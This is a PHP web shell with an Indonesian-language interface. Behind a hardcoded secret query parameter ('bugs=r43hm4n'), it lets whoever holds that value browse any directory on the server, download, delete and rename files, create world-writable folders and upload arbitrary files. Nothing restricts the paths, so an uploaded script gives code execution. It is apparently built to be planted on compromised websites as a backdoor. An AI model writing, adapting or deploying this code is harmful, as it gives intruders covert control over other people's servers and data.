<?php

class F_r43 {
  public $dir;
  public $url;
  function __construct($curDir = null) {
    if ($curDir == null) {
      $info = pathinfo(__FILE__);
      $this->dir = $info['dirname'];
    } else {
      $this->dir = $curDir;
    }
  }
  function fileList() {
    $files = array_slice(scandir($this->dir), 2);
    $list = array();
    for ($i = 0; $i < sizeof($files); $i++) {
      $type = filetype($this->dir . '/' . $files[$i]);
      $download = "?download={$files[$i]}&type={$type}&curDir={$this->dir}";
      $list[] = array(
        'file' => $files[$i],
        'type' => $type,
        'download' => $download,
        'delete' => "?delete={$files[$i]}&type={$type}&curDir={$this->dir}",
        'view' => ($type == 'dir') ? "?goDir={$this->dir}/{$files[$i]}&curDir={$this->dir}" : $download,
      );
    }
    return $list;
  }
  function rename($data) {
   $info = rename($data['curDir'] . '/' . $data['rename'], $data['curDir'] . '/' . $data['newName']);
   $this->dir = $data['curDir'];
  }
  function download($data) {
    if ($data['type'] == 'file') {
      $file=$data['curDir'] . '/' . $data['download'];
      header('Content-Description: File Transfer');
      header("Content-Type:application/octet-stream");
      header("Accept-Ranges: bytes");
      header("Content-Length: " . filesize($file));
      header('Expires: 0');
      header('Cache-Control: must-revalidate');
      header('Pragma: public');
      header("Content-Disposition: attachment; filename=" . $data['download']);
      flush(); // Flush system output buffer
      readfile($file);
      exit;
    } else if ($data['type'] == 'dir') {
      echo 'zip download not done.......<br>';
    }
  }
  function delete($data) {
    if ($data['type'] == 'dir') {
      $info = rmdir($data['curDir'] . '/' . $data['delete']);
    } else if ($data['type'] == 'file') {
      $info = unlink($data['curDir'] . '/' . $data['delete']);
    }
    $this->dir = $data['curDir'];
  }
  function goDir($dir) {
    $this->dir = $dir;
  }
  function backDir($dir) {
    $dirAr = explode('/', $dir);
    array_pop($dirAr);
    $bkdir = implode('/', $dirAr);
    $this->dir = $bkdir;
  }
  function createFolder($data) {
   $info = mkdir($data['curDir'] . '/' . $data['createFolder'], 0777);
   $this->dir = $data['curDir'];
  }
  function filesUpload($files, $dir) {
    for ($i = 0; $i < sizeof($files['filesUpload']['error']); $i++) {
      if ($files['filesUpload']['error'][$i] == 0){
        move_uploaded_file($files['filesUpload']['tmp_name'][$i], $dir . '/' . $files['filesUpload']['name'][$i]);
      }
    }
    $this->dir = $dir;
  }
  function auto($get, $files, $post) { 
    //go
    if (isset($get['goDir'])) {
      $this->goDir($get['goDir']);
    }
    //back
    if (isset($get['backDir'])) {
      $this->backDir($get['backDir']);
    }
    //rename
    if (isset($get['rename'])) {
      $this->rename($get);
    }
    //download
    if (isset($get['download'])) {
      $this->download($get);
    }
    //delete
    if (isset($get['delete'])) {
      $this->delete($get);
    }
    //createFolder
    if (isset($get['createFolder'])) {
      $this->createFolder($get);
    }
    //filesUpload
    if (isset($files['filesUpload'])) {
      $this->filesUpload($files, $get['curDir']);
    }
    return error_get_last();
  }
}
if(!isset($_SESSION)){session_start();}
if(isset($_GET['bugs'])){
    if($_GET['bugs']=="r43hm4n"){
        $_SESSION['rae_file']="r43hm4n";
        echo $_SESSION['rae_file'];
    }else{
        exit;
    }
}
if(!isset($_SESSION['rae_file'])){
    exit;
}
if(isset($_GET['aksi'])){
  if($_GET['aksi']=='keluar'){
    session_unset();
    session_destroy();
    echo '<script>window.location = "mf.php";</script>';
  }
} 
//action
$r43hm4n = new F_r43();
$error = $r43hm4n->auto($_GET, $_FILES, $_POST);
$list = $r43hm4n->fileList();
?>
<?php

?>
<!DOCTYPE html>
<html>
<head>
<title></title>
</head>
<body>
<a href="?aksi=keluar">Keluar</a>
<table>
  <tr>
    <th>Nama </th>
    <th>Jenis File</th>
    <th>Unduh</th>
    <th>Ganti Nama</th>
    <th>Hapus</th>
  </tr>
  <tr><td colspan="5"><hr></td></tr>
  <tr>
    <td><a href="?backDir=<?php echo $r43hm4n->dir; ?>">../back</a></td>
    <td align="center">[dir]</td>
    <td align="center">null</a></td>
    <td align="center">null</td>
    <td align="center">null</a></td>
  </tr>
  <tr><td colspan="5"><hr></td></tr>
  <?php for($i=0; $i<sizeof($list); $i++){ ?>
  <tr>
    <td><a href="<?php echo $list[$i]['view']; ?>"><?php echo $list[$i]['file']; ?></a></td>
    <td align="center">[<?php echo $list[$i]['type']; ?>]</td>
    <td align="center"><a href="<?php echo $list[$i]['download']; ?>" ><b>&veeeq;</b></a></td>
    <td>
      <input type="text" value="<?php echo $list[$i]['file']; ?>" r43hm4n-rename-input><input r43hm4n-data="<?php echo $list[$i]['file']; ?>" r43hm4n-data-type="<?php echo $list[$i]['type']; ?>" r43hm4n-data-new="<?php echo $list[$i]['file']; ?>" type="button" value="Rename" r43hm4n-rename-action>
    </td>
    <td align="center"><a onclick="return confirm('Yakin mau menghapus?')" href="<?php echo $list[$i]['delete']; ?>">&xotime;</a></td>
  </tr>
  <tr><td colspan="5"><hr></td></tr>
  <?php } ?>
  <tr>
    <td colspan="2"><input type="text" placeholder="Create folder"  r43hm4n-folder-input><input r43hm4n-folder-action type="button" value="Create"></td>
    <form method="POST" action="?curDir=<?php echo $r43hm4n->dir; ?>" multipart="" enctype="multipart/form-data">
    <td colspan="3"><input type="file" name="filesUpload[]" multiple><input type="submit" value="Upload"></td> 
    </form>
  </tr>
</table>
<p><a href="?goDir=<?php echo $r43hm4n->dir; ?>"><?php echo $r43hm4n->dir; ?></a></p>
<input type="hidden" r43hm4n="dir" value="<?php echo $r43hm4n->dir; ?>">
<pre>
<?php print_r($error); ?>
</pre>
<script>

  var f_r43 = {
    renameInput: function(elem) {
      elem.nextElementSibling.setAttribute('r43hm4n-data-new', elem.value);
    },
    renameAction: function(elem) {
      var dir = document.querySelector('input[r43hm4n=dir]');
      window.location.href=`?rename=${elem.getAttribute('r43hm4n-data')}&newName=${elem.getAttribute('r43hm4n-data-new')}&type=${elem.getAttribute('r43hm4n-data-type')}&curDir=${dir.value}`;
    },
    folderAction: function(elem) {
      var dir = document.querySelector('input[r43hm4n=dir]');
      var input = document.querySelector('input[r43hm4n-folder-input]');
      window.location.href = `?createFolder=${input.value}&curDir=${dir.value}`;
    }
  };

 var kRi = document.querySelectorAll('input[r43hm4n-rename-input]');
 for (let i = 0; i < kRi.length; i++) {
  kRi[i].addEventListener('input', function() {
    f_r43.renameInput(kRi[i]);
  });
 }

 var kRa = document.querySelectorAll('input[r43hm4n-rename-action]');
 for (let i = 0; i < kRa.length; i++) {
  kRa[i].addEventListener('click', function() {
    f_r43.renameAction(kRa[i]);
  });
 } 

 document.querySelector('input[r43hm4n-folder-action]').addEventListener('click', function() {
  f_r43.folderAction(this);
 });
</script>
</body>
</html>